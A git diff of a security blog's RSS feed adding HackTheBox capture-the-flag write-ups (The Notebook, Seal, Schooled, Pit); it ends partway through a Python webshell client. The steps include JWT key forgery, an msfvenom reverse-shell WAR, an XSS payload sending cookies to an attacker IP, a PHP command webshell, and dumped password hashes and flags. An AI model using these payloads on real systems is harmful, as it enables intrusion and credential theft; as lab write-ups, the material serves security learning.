@@ -7,16 +7,1068 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>© 2021 RoundofThree</copyright>
-    <lastBuildDate>Tue, 07 Sep 2021 13:18:54 +0200</lastBuildDate><atom:link href="/labs/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 07 Sep 2021 13:20:07 +0200</lastBuildDate><atom:link href="/labs/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Armageddon</title>
+      <title>The Notebook - HackTheBox machine</title>
+      <link>/labs/the_notebook/</link>
+      <pubDate>Tue, 07 Sep 2021 13:20:07 +0200</pubDate>
+      
+      <guid>/labs/the_notebook/</guid>
+      <description>Foothold 1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.
+2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called &amp;lsquo;admin&amp;rsquo;.
+3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:
+Header: { &amp;ldquo;typ&amp;rdquo;: &amp;ldquo;JWT&amp;rdquo;, &amp;ldquo;alg&amp;rdquo;: &amp;ldquo;RS256&amp;rdquo;, &amp;ldquo;kid&amp;rdquo;: &amp;ldquo;http://localhost:7070/privKey.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.&lt;/p&gt;
+&lt;p&gt;2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called &amp;lsquo;admin&amp;rsquo;.&lt;/p&gt;
+&lt;p&gt;3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:&lt;/p&gt;
+&lt;p&gt;Header:
+{
+&amp;ldquo;typ&amp;rdquo;: &amp;ldquo;JWT&amp;rdquo;,
+&amp;ldquo;alg&amp;rdquo;: &amp;ldquo;RS256&amp;rdquo;,
+&amp;ldquo;kid&amp;rdquo;: &amp;ldquo;http://localhost:7070/privKey.key&amp;rdquo;  &amp;lt;- private key
+}
+Payload:
+{
+&amp;ldquo;username&amp;rdquo;: &amp;ldquo;anna&amp;rdquo;,
+&amp;ldquo;email&amp;rdquo;: &amp;ldquo;&lt;a href=&#34;mailto:anna@gmail.com&#34;&gt;anna@gmail.com&lt;/a&gt;&amp;rdquo;,
+&amp;ldquo;admin_cap&amp;rdquo;: 0  &amp;lt;&amp;ndash; change to 1
+}&lt;/p&gt;
+&lt;p&gt;4- So I need access to the private key. Or I can change the &amp;lsquo;kid&amp;rsquo; field to my own IP.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;openssl genrsa -out privKey.key 4028
+python3 -m http.server 7070&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;5- There are interesting notes in Admin panel.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Need to fix config. PHP can be executed.&lt;/li&gt;
+&lt;li&gt;There are backup tasks.&lt;/li&gt;
+&lt;li&gt;There is a user named noah.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;6- Upload a PHP pw0ny shell and view it to remote code execution.&lt;/p&gt;
+&lt;p&gt;7- Download backup of home tarball and use the .ssh id_rsa to ssh into noah session. -&amp;gt; user.txt get!&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;8- sudo -l to find access to sudo docker exec -it webapp-dev01 ANY COMMAND&lt;/p&gt;
+&lt;p&gt;9- Use this PoC CVE-2019-5736 in main.go to get a reverse shell from root.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Seal - HackTheBox machine</title>
+      <link>/labs/seal/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:57 +0200</pubDate>
+      
+      <guid>/labs/seal/</guid>
+      <description>Rank: medium  Part of this article is encrypted with password:
+  --- DON&#39;T MODIFY THIS LINE --- Foothold 1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)
+2- After visiting seal.htb:8080 redirects to http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F
+Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0; node0 is repeated. 401 Unauthorized.
+jsessionid cookie is passed in the url, redirect param is &amp;lsquo;/&amp;rsquo;.
+3- Register an account in Gitbucket and access the source code of the webapp.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
+  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
+    
+      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
+    
+  &lt;/div&gt;
+  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-input&#34;
+      placeholder=&#39;Please input the password&#39;
+    /&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-button&#34;
+      type=&#34;button&#34;
+      value=&#39;Click to verify&#39;
+      onclick=&#34;_click_handler(this)&#34;
+    /&gt;
+  &lt;/div&gt;
+  &lt;div
+    class=&#34;hugo-encryptor-cipher-text&#34;
+    data-password=&#34;13302f0959a0be8c868a95076136a391&#34;
+    style=&#34;display: none;&#34;
+  &gt;
+    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
+    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap found 8080 (http proxy), 22 (ssh), 443 (http nginx)&lt;/p&gt;
+&lt;p&gt;2- After visiting seal.htb:8080 redirects to
+&lt;a href=&#34;http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F&#34;&gt;http://seal.htb:8080/signin;jsessionid=node01tjyqiz7gjnlz10tpoes47xr1g88.node0?redirect=%2F&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Set-Cookie: JSESSIONID=node0eechasxnr4hcp25y400b85jc53.node0;  node0 is repeated.
+401 Unauthorized.&lt;/p&gt;
+&lt;p&gt;jsessionid cookie is passed in the url, redirect param is &amp;lsquo;/&amp;rsquo;.&lt;/p&gt;
+&lt;p&gt;3- Register an account in Gitbucket and access the source code of the webapp. There are three directories: app, tomcat, nginx.
+The TODO list mentions:
+3.1- Remove mutual authentication for dashboard, setup registration and login features. &amp;lt;&amp;ndash; what is mutual auth?
+3.2- Deploy updated Tomcat confs. &amp;lt;&amp;ndash; look at what updates are pending in the commit diff files.
+&lt;!-- raw HTML omitted --&gt; in tomcat-users.xml
+3.3- Disable manager and host-manager. &amp;lt;&amp;ndash; what is this?&lt;/p&gt;
+&lt;p&gt;4- Read about Tomcat. Tomcat has a web interface to manage webapps and deployment, which by default can be accessed at /manager/html. Only tomcat users which have manager-gui role have access.&lt;/p&gt;
+&lt;p&gt;5- /manager/html returns 403 Forbidden by nginx. This is due to whitelisting. A bypass to this is directory path traversal. This blog explains how java applications suffer from path normalization vulnerability.
+&lt;a href=&#34;https://thehackingfactory.com/dot-dot-semicolon-rce&#34;&gt;https://thehackingfactory.com/dot-dot-semicolon-rce&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;See nginx/sites-enables/default: /manager/html, /host-manager/html, /admin/dashboard require ssl_client_verify to be SUCCESS, but we don&amp;rsquo;t have the client certificate. We can bypass the list with /manager/anything;/..;/html. Nginx sees /manager/anything;/..;/html, but Tomcat sees /manager/anything/../html.&lt;/p&gt;
+&lt;p&gt;6- Deploy meterpreter reverse shell WAR file.
+msfvenom -p java/meterpreter/reverse_tcp LHOST=tun0 LPORT=1234 -f war -o health.war
+Catch POST packet in Burpsuite and change the url path to bypass the client certificate check by nginx.&lt;/p&gt;
+&lt;p&gt;7- Metasploit listen to port 1234. Visit /health.&lt;/p&gt;
+&lt;p&gt;8- getuid reveals we are user tomcat. There is a folder named &amp;lsquo;luis&amp;rsquo; in /home folder. tomcat user doesn&amp;rsquo;t have permissions to read user.txt nor .ssh/id_rsa. The existence of .ansible directory hints that there may be some backup task. Explore /opt to find backups/.
+backups/
+&amp;ndash;&amp;gt; archives/ &amp;ndash;&amp;gt; backup-xxx-xxx.gz
+&amp;ndash;&amp;gt; playbook/ &amp;ndash;&amp;gt; run.yml&lt;/p&gt;
+&lt;p&gt;We cannot modify run.yml.&lt;/p&gt;
+&lt;p&gt;8- In run.yml, we can exploit copy_links=yes.
+ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa
+cp archives/backup-THE-MOST-RECENT-ONE.gz /tmp
+Download the gz file.
+file reveals it&amp;rsquo;s a tar gz file &amp;ndash;&amp;gt; tar xvfz backup.tar.gz &amp;ndash;&amp;gt; dashboard/ &amp;ndash;&amp;gt; see uploads/id_rsa&lt;/p&gt;
+&lt;p&gt;9- ssh -i id_rsa &lt;a href=&#34;mailto:luis@seal.htb&#34;&gt;luis@seal.htb&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;sudo -l&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;See &lt;a href=&#34;https://gtfobins.github.io/gtfobins/ansible-playbook/&#34;&gt;https://gtfobins.github.io/gtfobins/ansible-playbook/&lt;/a&gt;. It&amp;rsquo;s very straighforward since ansible playbook is an automation tool which can run any command.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;root.txt: 13302f0959a0be8c868a95076136a391&lt;/p&gt;
+
+  &lt;/div&gt;
+&lt;/div&gt;
+
+</content>
+    </item>
+    
+    <item>
+      <title>Schooled - HackTheBox machine</title>
+      <link>/labs/schooled/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:47 +0200</pubDate>
+      
+      <guid>/labs/schooled/</guid>
+      <description>Rank: medium  Foothold 1- nmap discovered 22, 80, 33060 (mysqlx)
+2- Web clues:
+ contact.php -&amp;gt; 404 email: admissions@schooled.htb web address schooled.htb -&amp;gt; suggests there can be subdomains  3- wfuzz -c -u &amp;ldquo;http://schooled.htb/&amp;quot; -H &amp;ldquo;Host:FUZZ.schooled.htb&amp;rdquo; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &amp;ndash;hl 461 (Hide those whose line is 461).
+Found moodle.schooled.htb.
+4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- nmap discovered 22, 80, 33060 (mysqlx)&lt;/p&gt;
+&lt;p&gt;2- Web clues:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;contact.php -&amp;gt; 404&lt;/li&gt;
+&lt;li&gt;email: &lt;a href=&#34;mailto:admissions@schooled.htb&#34;&gt;admissions@schooled.htb&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;web address schooled.htb -&amp;gt; suggests there can be subdomains&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;3- wfuzz -c -u &amp;ldquo;&lt;a href=&#34;http://schooled.htb/%22&#34;&gt;http://schooled.htb/&amp;quot;&lt;/a&gt; -H &amp;ldquo;Host:FUZZ.schooled.htb&amp;rdquo; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &amp;ndash;hl 461 (Hide those whose line is 461).&lt;/p&gt;
+&lt;p&gt;Found moodle.schooled.htb.&lt;/p&gt;
+&lt;p&gt;4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.&lt;/p&gt;
+&lt;p&gt;5- Check for XSS in every input (description, chat). Steal the cookie to access higher role (Teacher role). Wait for a long time&amp;hellip;
+Because the teacher will check for our profile, set the MoodleNet to&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Image&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://10.10.14.23:8888/?&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Description is not vulnerable.&lt;/p&gt;
+&lt;p&gt;10.10.10.234 - - [02/Aug/2021 10:48:40] &amp;ldquo;GET /?MoodleSession=g6913p6t2kegeg9n1dgee9qm12 HTTP/1.1&amp;rdquo; 200 -&lt;/p&gt;
+&lt;p&gt;6- CVE-2020-14321. This vulnerability allows Course enrolments to allow privilege escalation from teacher role into manager role.&lt;/p&gt;
+&lt;p&gt;Burpsuite when enrolling a new user. Change userlist param to current account id (24?) and set roletoassign to 1 (manager).&lt;/p&gt;
+&lt;p&gt;7- As Liann Carter, go to Site administration page at &lt;a href=&#34;http://moodle.schooled.htb/moodle/admin/search.php&#34;&gt;http://moodle.schooled.htb/moodle/admin/search.php&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Moodle 3.9 (Build: 20200615).&lt;/p&gt;
+&lt;p&gt;// 8- Go to Users / Edit roles / Manager / Edit / Save changes &amp;ndash;&amp;gt; use burpsuite to change everything to 1 (allowed).&lt;/p&gt;
+&lt;p&gt;9- Go to Plugins / Install plugins / submit rce.zip and install.&lt;/p&gt;
+&lt;p&gt;// 10- Visit &lt;a href=&#34;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php&#34;&gt;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php&lt;/a&gt; to activate the webshell.&lt;/p&gt;
+&lt;p&gt;11- Relay a reverse shell with pentestmonket php reverse shell as www-data user.&lt;/p&gt;
+&lt;p&gt;12- Cat the apache config to get MySQL credentials.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;find / -name &amp;lsquo;config.php&amp;rsquo; 2&amp;gt;/dev/null
+&amp;ndash;&amp;gt; /usr/local/www/apache24/data/moodle/config.php&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;13- Connect to mysql and retrieve all credentials for moodle.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;find / -name mysql 2&amp;gt;/dev/null
+&amp;ndash;&amp;gt; /usr/local/bin/mysql
+/usr/local/bin/mysql -u moodle &amp;ndash;password=PlaybookMaster2020 -e &amp;lsquo;use moodle; show tables;&amp;rsquo;
+&amp;ndash;&amp;gt; found mdl_user
+/usr/local/bin/mysql -u moodle &amp;ndash;password=PlaybookMaster2020 -e &amp;lsquo;use moodle; select * from mdl_user;&amp;rsquo;
+&amp;ndash;&amp;gt; jamie password hash is $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
+&amp;ndash;&amp;gt; higgins jane -&amp;gt; $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
+&amp;ndash;&amp;gt; manuel philips -&amp;gt; $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
+&amp;ndash;&amp;gt; carter lianne -&amp;gt; $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;14- John crack the credentials.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;john &amp;ndash;wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt tocrack.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;15- SSH into jamie:!QAZ2wsx&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;1- sudo -l to find pkg update and pkg install *
+2- Create a custom package that sets the SETUID bit in /bin/bash. See pkg_install.sh.
+3- bash -p (this option exploits the SETUID bit if set).&lt;/p&gt;
+&lt;p&gt;root.txt: 85336d96f89869c69d073a90de2730b1&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Pit - HackTheBox machine</title>
+      <link>/labs/pit/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:41 +0200</pubDate>
+      
+      <guid>/labs/pit/</guid>
+      <description>Rank: medium  Part of this article is encrypted with password:
+  --- DON&#39;T MODIFY THIS LINE --- Foothold 1- Nmap discovered 22, 80, 9090. Port 9090 is an http port for remote connection to CentOS. We have to log in with in the server user account. From ssl port I retrieved the commonName dms-pit.htb. 9090 seems to be zeus-admin service.
+I really shouldn&amp;rsquo;t ignore UDP ports in a pentest&amp;hellip; DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are juicy ports.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
+  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
+    
+      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
+    
+  &lt;/div&gt;
+  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-input&#34;
+      placeholder=&#39;Please input the password&#39;
+    /&gt;
+    &lt;input
+      class=&#34;hugo-encryptor-button&#34;
+      type=&#34;button&#34;
+      value=&#39;Click to verify&#39;
+      onclick=&#34;_click_handler(this)&#34;
+    /&gt;
+  &lt;/div&gt;
+  &lt;div
+    class=&#34;hugo-encryptor-cipher-text&#34;
+    data-password=&#34;b96ee993d16220d6c0c0d519a4179b46&#34;
+    style=&#34;display: none;&#34;
+  &gt;
+    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
+    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap discovered 22, 80, 9090. Port 9090 is an http port for remote connection to CentOS. We have to log in with in the server user account. From ssl port I retrieved the commonName dms-pit.htb. 9090 seems to be zeus-admin service.&lt;/p&gt;
+&lt;p&gt;I really shouldn&amp;rsquo;t ignore UDP ports in a pentest&amp;hellip;
+DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are juicy ports.
+Nmap udp ports to check for SNMP, DNS or DHCP.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sU -sV -v -oA udpnmap pit.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2- Web enumeration:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nikto -h pit.htb
+&lt;span style=&#34;color:#75715e&#34;&gt;# --&amp;gt; Nginx 1.14.1 from Red Hat Enterprise. &lt;/span&gt;
+nikto -h pit.htb:9090
+&lt;span style=&#34;color:#75715e&#34;&gt;# --&amp;gt; No server headers. &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;http://pit.htb:80&#34;&gt;http://pit.htb:80&lt;/a&gt; is a Nginx welcome page.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://pit.htb:9090&#34;&gt;http://pit.htb:9090&lt;/a&gt; is a web system management console, CentOS cockpit (google it)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://dms-pit.htb&#34;&gt;https://dms-pit.htb&lt;/a&gt; is Forbidden 403&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://dms-pit.htb:9090&#34;&gt;https://dms-pit.htb:9090&lt;/a&gt; is the cockpit login page again&lt;/p&gt;
+&lt;p&gt;Run some fuzzing in the background.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dms-pit.htb/FUZZ -fc &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# --&amp;gt; Nothing&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dms-pit.htb:9090/FUZZ -fs 43548,0,73
+&lt;span style=&#34;color:#75715e&#34;&gt;# --&amp;gt; /ping&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;/ping returns JSON { &amp;ldquo;service&amp;rdquo;: &amp;ldquo;cockpit&amp;rdquo; }&lt;/p&gt;
+&lt;p&gt;3- Check public community string for SNMP.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;snmp-check 10.10.10.241 -p public
+&amp;ndash;&amp;gt; list of processes, no interesting processes
+snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendOutputFull &amp;gt; snmpwalk.txt
+snmpwalk -v 1 -c public 10.10.10.241 .1 &amp;gt; snmpwalk-all.txt
+&amp;ndash;&amp;gt;
+Via manual inspection (vim snmpwalk-all.txt), I found an interesting path: /var/www/html/seeddms51x/seeddms and /usr/bin/monitor.
+And usernames michelle and root.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;4- SSH with michelle:michelle but SSH requires public key authentication, sad :(.&lt;/p&gt;
+&lt;p&gt;5- Add path /seeddms51x/seeddms to all combinations of hostname and port. Found a DMS login at &lt;a href=&#34;https://dms-pit.htb/seeddms51x/seeddms&#34;&gt;https://dms-pit.htb/seeddms51x/seeddms&lt;/a&gt;. Login with michelle:michelle.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It runs Seed DMS.&lt;/li&gt;
+&lt;li&gt;There is an upgrade notice that reveals that the Seed DMS is version 5.1.15.&lt;/li&gt;
+&lt;li&gt;There is a Docs folder with two user folders: Michelle and Jack.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The CHANGELOG did mention that there is a security issue. This line:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;fix for CVE-2019-12744 (Remote Command Execution through unvalidated file upload)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;6- Cannot login with hand crafted credentials to CentOS cockpit console.&lt;/p&gt;
+&lt;p&gt;7- I am confused. Try to exploit CVE-2019-12744 although the admin should have fixed it according to the CHANGELOG.&lt;/p&gt;
+&lt;p&gt;Upload 1.php and access it through &lt;a href=&#34;http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=cat+/etc/passwd&#34;&gt;http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=cat+/etc/passwd&lt;/a&gt;.
+Actually, the path is &lt;code&gt;/data/1048576/&amp;lt;documentid&amp;gt;/&amp;lt;version&amp;gt;.&amp;lt;extension&amp;gt;&lt;/code&gt;.
+So I wrote a python webshell: seeddmswebshell.py&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 seeddmswebshell.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=&amp;#39;&lt;/span&gt;
+id
+&lt;span style=&#34;color:#75715e&#34;&gt;# uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0&lt;/span&gt;
+ls /var/www/html/seeddms51x/conf
+cat /var/www/html/seeddms51x/conf/settings.xml &lt;span style=&#34;color:#75715e&#34;&gt;# (see saved settings.xml)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;1.php:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;])){
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&amp;#34;&lt;/span&gt;;
+        $cmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ($_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;]);
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($cmd);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;seeddmswebshell.py&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cmd &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Cmd
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; requests
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Webshell&lt;/span&gt;(Cmd):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, url):
+        super()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__()
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;prompt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(seeddms)&amp;#39;&lt;/span&gt;
